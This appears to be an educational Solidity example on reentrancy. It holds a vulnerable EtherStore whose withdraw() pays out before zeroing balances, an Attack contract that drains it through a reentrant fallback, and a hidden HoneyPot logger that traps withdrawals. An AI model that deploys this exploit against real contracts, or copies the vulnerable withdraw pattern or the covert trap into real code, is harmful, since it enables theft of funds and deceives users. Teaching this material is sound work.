// SPDX-License-Identifier: MIT 
pragma solidity 0.8.20;

contract EtherStore {
    mapping(address => uint) public balances;
    Logger logger;

    constructor(Logger _logger) {
        logger = Logger(_logger);
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        logger.log(msg.sender,  "Deposit");
    }
 
    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
        balances[msg.sender] = 0;
        logger.log(msg.sender, "Withdraw");
    }    
}

// normal Logger contract
contract Logger {
    event Log(address caller, string action);

    function log(address _caller, string memory _action) public {
        emit Log(_caller, _action);
    }
}

// Try to steal ETH from EtherStore using ReEntrancy (Source Code 6-2)
contract Attack {
    EtherStore etherStore;

    constructor(EtherStore _etherStore) {
        etherStore = EtherStore(_etherStore);
    }

    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    // Don't forget to put 1 ETH before executing
    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
 
// This code can be a separate file that others cannot read it.
contract HoneyPot {
    event Log(address caller, string action);
    function log(address _caller, string memory _action) public {
        emit Log(_caller, _action);
        if (equal(_action, "Withdraw")) {
            revert("It's a trap");
        }
    }

    // string compare function to filter action
    function equal(string memory _a, string memory _b) public pure returns (bool) {
        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));
    }
}
